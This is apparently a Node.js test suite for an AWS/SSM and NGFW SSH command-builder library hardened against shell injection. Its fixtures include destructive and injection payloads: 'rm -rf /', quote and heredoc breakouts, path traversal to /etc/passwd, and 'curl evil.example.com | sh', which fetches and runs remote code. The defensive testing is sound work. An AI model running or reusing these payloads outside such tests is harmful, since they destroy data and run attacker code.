import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  REGION,
  getProfile,
  buildAwsArgv,
  awsExec,
  awsJson,
  awsText,
  buildSsmSendCommandArgs,
  buildNgfwSshCommands,
  validateNgfwIp,
} from "./lib.js";

// ---------------------------------------------------------------------------
// REGION / getProfile
// ---------------------------------------------------------------------------
describe("REGION", () => {
  it("is us-east-2", () => {
    assert.equal(REGION, "us-east-2");
  });
});

describe("getProfile", () => {
  const profiles = { dev: "dev-profile", prod: "prod-profile" };

  it("returns the profile for a valid env", () => {
    assert.equal(getProfile(profiles, "dev"), "dev-profile");
    assert.equal(getProfile(profiles, "prod"), "prod-profile");
  });

  it("throws for missing profile", () => {
    assert.throws(
      () => getProfile({}, "dev"),
      /AWS profile not set for dev/
    );
  });

  it("throws with env name in error message", () => {
    assert.throws(
      () => getProfile({}, "prod"),
      /PANW_SHIFTER_PROD_PROFILE/
    );
  });
});

// ---------------------------------------------------------------------------
// buildAwsArgv (issue #759)
// ---------------------------------------------------------------------------
describe("buildAwsArgv", () => {
  it("appends --profile, --region, and extra flags after caller args", () => {
    const argv = buildAwsArgv(
      ["ec2", "describe-instances", "--filters", "Name=tag:Name,Values=*ngfw*"],
      "dev-profile",
      "us-east-2",
      ["--output", "json"]
    );
    assert.deepEqual(argv, [
      "ec2",
      "describe-instances",
      "--filters",
      "Name=tag:Name,Values=*ngfw*",
      "--profile",
      "dev-profile",
      "--region",
      "us-east-2",
      "--output",
      "json",
    ]);
  });

  it("works with no extra flags", () => {
    const argv = buildAwsArgv(["s3", "ls"], "p", "us-east-2");
    assert.deepEqual(argv, [
      "s3",
      "ls",
      "--profile",
      "p",
      "--region",
      "us-east-2",
    ]);
  });

  it("rejects shell-string args with TypeError that names #759", () => {
    assert.throws(
      () => buildAwsArgv("ec2 describe-instances", "p", "r"),
      (e) =>
        e instanceof TypeError &&
        /argv array/.test(e.message) &&
        /#759/.test(e.message)
    );
  });

  it("rejects null and undefined args with TypeError", () => {
    assert.throws(
      () => buildAwsArgv(null, "p", "r"),
      (e) => e instanceof TypeError
    );
    assert.throws(
      () => buildAwsArgv(undefined, "p", "r"),
      (e) => e instanceof TypeError
    );
  });

  it("preserves $() command-substitution payloads literally", () => {
    const argv = buildAwsArgv(
      ["ssm", "send-command", "--parameters", "$(rm -rf /)"],
      "p",
      "r"
    );
    assert.equal(argv[3], "$(rm -rf /)");
  });

  it("preserves backticks, quotes, semicolons, pipes, ampersands, newlines literally", () => {
    const payload = `";|&\n$(whoami)\`id\`'; rm -rf /; echo '`;
    const argv = buildAwsArgv(
      ["ssm", "send-command", "--parameters", payload],
      "p",
      "r"
    );
    assert.equal(argv[3], payload);
  });
});

// ---------------------------------------------------------------------------
// awsExec / awsJson / awsText (runner-injected)
// ---------------------------------------------------------------------------

// Recording runner. The shared `awsExec` hardcodes the binary to
// "aws" inside `defaultRunner` so the runner only ever sees argv +
// options; tests inspect those.
function makeRecordingRunner({
  status = 0,
  stdout = "",
  stderr = "",
  error = null,
} = {}) {
  const calls = [];
  const fn = (argv, options) => {
    calls.push({ argv, options });
    return { status, stdout, stderr, error };
  };
  fn.calls = calls;
  return fn;
}

describe("awsExec", () => {
  it("invokes the runner with the built argv (binary is hardcoded to 'aws')", () => {
    const runner = makeRecordingRunner({ stdout: "ok\n" });
    awsExec("p", ["s3", "ls"], { runner });
    assert.equal(runner.calls.length, 1);
    assert.deepEqual(runner.calls[0].argv, [
      "s3",
      "ls",
      "--profile",
      "p",
      "--region",
      REGION,
    ]);
  });

  it("forwards extraFlags and region overrides through buildAwsArgv ordering", () => {
    const runner = makeRecordingRunner({ stdout: "x" });
    awsExec("p", ["ec2", "describe-instances"], {
      runner,
      region: "eu-west-1",
      extraFlags: ["--output", "text"],
    });
    assert.deepEqual(runner.calls[0].argv, [
      "ec2",
      "describe-instances",
      "--profile",
      "p",
      "--region",
      "eu-west-1",
      "--output",
      "text",
    ]);
  });

  it("returns stdout untrimmed", () => {
    const runner = makeRecordingRunner({ stdout: "  hello\n" });
    assert.equal(awsExec("p", ["s3", "ls"], { runner }), "  hello\n");
  });

  it("wraps runner.error with the operation label and preserves the cause", () => {
    const boom = new Error("boom");
    const runner = makeRecordingRunner({ error: boom });
    assert.throws(
      () => awsExec("p", ["s3", "ls"], { runner }),
      (e) => e.message === "aws s3 ls: boom" && e.cause === boom
    );
  });

  it("throws with the operation label and trimmed stderr on non-zero status", () => {
    const runner = makeRecordingRunner({
      status: 1,
      stderr: "  AccessDenied: bad creds\n",
    });
    assert.throws(
      () => awsExec("p", ["ec2", "describe-instances"], { runner }),
      (e) => e.message === "aws ec2 describe-instances: AccessDenied: bad creds"
    );
  });

  it("falls back to a labeled generic message when stderr is empty and status is non-zero", () => {
    const runner = makeRecordingRunner({ status: 2 });
    assert.throws(
      () => awsExec("p", ["ssm", "send-command"], { runner }),
      (e) => e.message === "aws ssm send-command: exited with status 2"
    );
  });

  it("uses a generic 'aws' label when args is empty (defensive)", () => {
    const runner = makeRecordingRunner({ status: 1, stderr: "boom" });
    assert.throws(
      () => awsExec("p", [], { runner }),
      (e) => e.message === "aws: boom"
    );
  });

  it("propagates timeout option to the runner", () => {
    const runner = makeRecordingRunner({ stdout: "x" });
    awsExec("p", ["s3", "ls"], { runner, timeoutMs: 500 });
    assert.equal(runner.calls[0].options.timeout, 500);
  });

  it("rejects shell-string args without invoking the runner", () => {
    const runner = makeRecordingRunner({ stdout: "x" });
    assert.throws(
      () => awsExec("p", "s3 ls", { runner }),
      (e) => e instanceof TypeError
    );
    assert.equal(runner.calls.length, 0);
  });
});

describe("awsJson", () => {
  it("appends --output json after caller args and parses stdout", () => {
    const runner = makeRecordingRunner({ stdout: '{"a":1}' });
    const out = awsJson("p", ["ec2", "describe-instances"], { runner });
    assert.deepEqual(out, { a: 1 });
    assert.deepEqual(runner.calls[0].argv, [
      "ec2",
      "describe-instances",
      "--profile",
      "p",
      "--region",
      REGION,
      "--output",
      "json",
    ]);
  });

  it("places --output json AFTER caller-supplied --output flags so it wins", () => {
    const runner = makeRecordingRunner({ stdout: '{"a":1}' });
    awsJson("p", ["ec2", "describe-instances", "--output", "text"], { runner });
    const { argv } = runner.calls[0];
    const last = argv.lastIndexOf("--output");
    assert.equal(argv[last + 1], "json");
  });

  it("places --output json AFTER caller-supplied extraFlags so it always wins", () => {
    const runner = makeRecordingRunner({ stdout: "[]" });
    awsJson("p", ["ec2", "describe-instances"], {
      runner,
      extraFlags: ["--output", "text"],
    });
    const { argv } = runner.calls[0];
    const last = argv.lastIndexOf("--output");
    assert.equal(argv[last + 1], "json");
  });
});

describe("awsText", () => {
  it("returns trimmed stdout", () => {
    const runner = () => ({
      status: 0,
      stdout: "  i-0123\n",
      stderr: "",
      error: null,
    });
    assert.equal(awsText("p", ["ec2", "describe-instances"], { runner }), "i-0123");
  });

  it("does not append --output text automatically", () => {
    let captured;
    const runner = (argv) => {
      captured = argv;
      return { status: 0, stdout: "x", stderr: "", error: null };
    };
    awsText("p", ["ec2", "describe-instances"], { runner });
    assert.ok(!captured.includes("--output"));
  });
});

// ---------------------------------------------------------------------------
// buildSsmSendCommandArgs (single argv element for --parameters JSON)
// ---------------------------------------------------------------------------

describe("buildSsmSendCommandArgs", () => {
  it("wraps commands in a JSON.stringified --parameters argv element", () => {
    const argv = buildSsmSendCommandArgs({
      instanceId: "i-0123456789abcdef0",
      docName: "AWS-RunShellScript",
      commands: ["uptime"],
    });
    assert.deepEqual(argv, [
      "ssm",
      "send-command",
      "--instance-ids",
      "i-0123456789abcdef0",
      "--document-name",
      "AWS-RunShellScript",
      "--parameters",
      JSON.stringify({ commands: ["uptime"] }),
    ]);
  });

  it("keeps shell metacharacters inside the commands JSON literal (single argv element)", () => {
    const cmd = "echo $(whoami) && touch /tmp/pwn";
    const argv = buildSsmSendCommandArgs({
      instanceId: "i-aaaa",
      docName: "AWS-RunShellScript",
      commands: [cmd],
    });
    const parametersIdx = argv.indexOf("--parameters");
    assert.equal(typeof argv[parametersIdx + 1], "string");
    assert.equal(argv.length, parametersIdx + 2);
    assert.deepEqual(JSON.parse(argv[parametersIdx + 1]), { commands: [cmd] });
  });

  it("survives a single-quote breakout payload as one argv element", () => {
    const cmd = "'; rm -rf /; echo '";
    const argv = buildSsmSendCommandArgs({
      instanceId: "i-aaaa",
      docName: "AWS-RunShellScript",
      commands: [cmd],
    });
    const parameters = argv[argv.indexOf("--parameters") + 1];
    assert.deepEqual(JSON.parse(parameters), { commands: [cmd] });
  });

  it("encodes embedded newlines into the JSON parameters argv element", () => {
    const cmd = "line one\nline two\n; rm -rf /";
    const argv = buildSsmSendCommandArgs({
      instanceId: "i-aaaa",
      docName: "AWS-RunShellScript",
      commands: [cmd],
    });
    const parameters = argv[argv.indexOf("--parameters") + 1];
    assert.deepEqual(JSON.parse(parameters), { commands: [cmd] });
  });
});

// ---------------------------------------------------------------------------
// validateNgfwIp
// ---------------------------------------------------------------------------

describe("validateNgfwIp", () => {
  it("accepts valid dotted-quad IPv4 addresses", () => {
    for (const ip of ["10.0.0.1", "192.168.1.254", "172.16.0.0", "0.0.0.0", "255.255.255.255"]) {
      assert.equal(validateNgfwIp(ip), ip);
    }
  });

  it("rejects octets outside 0-255", () => {
    for (const ip of ["256.0.0.1", "1.2.3.300", "999.0.0.0"]) {
      assert.throws(() => validateNgfwIp(ip), /Invalid NGFW IPv4 address/);
    }
  });

  it("rejects malformed strings", () => {
    for (const bad of [
      "",
      "not-an-ip",
      "10.0.0",
      "10.0.0.1.5",
      "10.0.0.01a",
      " 10.0.0.1",
      "10.0.0.1 ",
    ]) {
      assert.throws(() => validateNgfwIp(bad), /Invalid NGFW IPv4 address/);
    }
  });

  it("rejects shell metacharacters embedded in the address", () => {
    for (const evil of [
      "10.0.0.1; rm -rf /",
      "10.0.0.1$(id)",
      "10.0.0.1`whoami`",
      "10.0.0.1 admin@evil.example.com",
      "10.0.0.1\nmalicious",
    ]) {
      assert.throws(() => validateNgfwIp(evil), /Invalid NGFW IPv4 address/);
    }
  });

  it("throws TypeError for non-string input", () => {
    for (const bad of [null, undefined, 12345, {}, []]) {
      assert.throws(() => validateNgfwIp(bad), TypeError);
    }
  });
});

// ---------------------------------------------------------------------------
// buildNgfwSshCommands (issue #759 — remote shell boundary)
// ---------------------------------------------------------------------------

function decodeEncodedCommand(commands) {
  // The ssh pipeline is the last line: `printf %s '<base64>' | base64 -d | ssh ...`
  const pipeline = commands.at(-1);
  const match = /^printf %s '([A-Za-z0-9+/=]*)' \| base64 -d \| ssh /.exec(pipeline);
  if (!match) {
    throw new Error(`pipeline line did not match expected shape: ${pipeline}`);
  }
  return Buffer.from(match[1], "base64").toString("utf-8");
}

// PAN-OS CLI is line-oriented; buildNgfwSshCommands appends a trailing
// newline to the command bytes before encoding so the appliance
// receives a complete line. Round-trip tests strip that newline before
// comparing against the caller-supplied command.
function decodedWithoutTrailingNewline(commands) {
  const decoded = decodeEncodedCommand(commands);
  return decoded.endsWith("\n") ? decoded.slice(0, -1) : decoded;
}

const KEY_PATH_RE = /^\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem$/;

describe("buildNgfwSshCommands", () => {
  // Fake placeholder key. Header text is intentionally non-standard so
  // the detect-private-key pre-commit hook does not match it. The
  // helper only treats this as opaque heredoc content.
  const sshKey = "FAKE-TEST-KEY-MATERIAL\nopaque-bytes\nFAKE-TEST-KEY-END\n";
  const ngfwIp = "10.0.0.5";

  it("returns the expected shell script with a per-invocation key path and exit-code-preserving cleanup", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    assert.equal(cmds.length, 7);
    assert.equal(cmds[0], `set -e`);
    const catMatch = /^cat > (\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem) << 'EOFKEY'$/.exec(cmds[1]);
    assert.ok(catMatch, `cat line shape: ${cmds[1]}`);
    const path = catMatch[1];
    assert.match(path, KEY_PATH_RE);
    assert.equal(cmds[2], sshKey);
    assert.equal(cmds[3], `EOFKEY`);
    assert.equal(cmds[4], `chmod 600 ${path}`);
    // EXIT trap captures the SSH exit code BEFORE running cleanup so SSM
    // reports the real PAN-OS failure status instead of the rm exit code.
    assert.equal(cmds[5], `trap 'rc=$?; rm -f ${path}; exit $rc' EXIT`);
    // The ssh pipeline is the LAST command so its exit code (preserved
    // by the EXIT trap) propagates to SSM.
    const sshLine = cmds[6];
    assert.ok(sshLine.startsWith("printf %s '"));
    assert.ok(sshLine.includes(`' | base64 -d | ssh -i ${path} `));
    const printfMatch = /^printf %s '([A-Za-z0-9+/=]+)'/.exec(sshLine);
    assert.ok(printfMatch, "printf segment must contain only base64 characters");
  });

  it("uses a unique key path per invocation so concurrent calls do not clobber each other", () => {
    const a = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const b = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const pathA = /^cat > (\S+) /.exec(a[1])[1];
    const pathB = /^cat > (\S+) /.exec(b[1])[1];
    assert.notEqual(pathA, pathB);
  });

  it("accepts an explicit keyPath when caller supplies one", () => {
    const cmds = buildNgfwSshCommands({
      sshKey,
      ngfwIp,
      command: "show",
      keyPath: "/tmp/ngfw-fixed.pem",
    });
    assert.ok(cmds[1].startsWith("cat > /tmp/ngfw-fixed.pem"));
    assert.equal(cmds[4], "chmod 600 /tmp/ngfw-fixed.pem");
    assert.equal(cmds[5], "trap 'rc=$?; rm -f /tmp/ngfw-fixed.pem; exit $rc' EXIT");
  });

  it("preserves the SSH exit code through cleanup", () => {
    // The EXIT trap captures $? before the rm so a PAN-OS / SSH
    // failure surfaces as the script's exit code instead of being
    // masked by the cleanup command's status.
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const trapLine = cmds.find((c) => c.startsWith("trap "));
    assert.ok(trapLine, "missing EXIT trap");
    assert.match(trapLine, /^trap 'rc=\$\?; rm -f \S+; exit \$rc' EXIT$/);
    // set -e ensures non-zero from any command short-circuits the
    // script so the trap captures the failing exit code, not the
    // status of any subsequent line.
    assert.equal(cmds[0], "set -e");
  });

  it("rejects a keyPath that escapes the /tmp/ngfw- prefix or contains shell metacharacters", () => {
    for (const bad of [
      "/etc/passwd",
      "/tmp/other.pem",
      "/tmp/ngfw-../etc/passwd",
      "/tmp/ngfw-$(id).pem",
      "/tmp/ngfw-`whoami`.pem",
      "/tmp/ngfw-; rm -rf /.pem",
      "/tmp/ngfw-with space.pem",
    ]) {
      assert.throws(
        () => buildNgfwSshCommands({ sshKey, ngfwIp, command: "show", keyPath: bad }),
        /Invalid keyPath/,
        `expected rejection for: ${bad}`
      );
    }
  });

  it("uses a single-quoted heredoc terminator so the SSH key is not expanded", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    // 'EOFKEY' (single-quoted) tells the shell not to expand $vars, $(), or backticks
    // inside the heredoc body. Plain EOFKEY would expand them.
    assert.match(cmds[1], /^cat > \/tmp\/ngfw-[A-Za-z0-9._-]+\.pem << 'EOFKEY'$/);
  });

  it("appends a trailing newline so PAN-OS receives a complete line", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    const decoded = decodeEncodedCommand(cmds);
    assert.equal(decoded, "show system info\n");
  });

  it("does not double-append a newline when the caller already supplied one", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info\n" });
    const decoded = decodeEncodedCommand(cmds);
    assert.equal(decoded, "show system info\n");
    assert.ok(!decoded.endsWith("\n\n"));
  });

  it("base64-round-trips a benign PAN-OS command", () => {
    const command = "show interface all";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("base64-round-trips $() command-substitution payloads", () => {
    const command = "$(rm -rf /)";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("base64-round-trips backtick command-substitution payloads", () => {
    const command = "`id`";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("base64-round-trips single and double quote breakouts", () => {
    const command = `'; touch /tmp/pwn; echo "evil"`;
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("base64-round-trips semicolons, pipes, ampersands, and newlines", () => {
    const command = "show config; rm -rf / && curl evil.example.com | sh\nshow system info";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("base64-round-trips a payload containing the heredoc terminator", () => {
    const command = "show interface all\nEOFKEY\nrm -rf /";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    assert.equal(decodedWithoutTrailingNewline(cmds), command);
  });

  it("never includes the raw command string anywhere in the shell command list", () => {
    // The whole point of base64-encoding is that the portal shell never
    // sees the literal command bytes. Concatenate every shell line and
    // assert that no line contains a known dangerous payload as a
    // literal substring.
    const command = "$(whoami) && touch /tmp/pwn";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    const joined = cmds.join("\n");
    assert.ok(!joined.includes("$(whoami)"), "raw $() leaked into shell payload");
    assert.ok(!joined.includes("touch /tmp/pwn"), "raw touch leaked into shell payload");
  });

  it("keeps the encoded base64 character set shell-safe inside single quotes", () => {
    // Base64 outputs only [A-Za-z0-9+/=]; none are special inside
    // single quotes, so the printf '...' substring cannot be broken
    // open by attacker-controlled command bytes.
    const command = "$(curl evil.example.com)";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    const sshLine = cmds.at(-1);
    const m = /^printf %s '([^']*)'/.exec(sshLine);
    assert.ok(m, "printf line did not parse");
    assert.match(m[1], /^[A-Za-z0-9+/=]+$/);
    // No single quote inside the encoded segment, so it cannot escape.
    assert.ok(!m[1].includes("'"));
  });

  it("rejects a malformed ngfwIp via validateNgfwIp", () => {
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp: "10.0.0.1; rm -rf /", command: "show" }),
      /Invalid NGFW IPv4 address/
    );
  });

  it("rejects empty sshKey", () => {
    assert.throws(
      () => buildNgfwSshCommands({ sshKey: "", ngfwIp, command: "show" }),
      TypeError
    );
  });

  it("rejects non-string command", () => {
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp, command: null }),
      TypeError
    );
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp, command: 42 }),
      TypeError
    );
  });
});
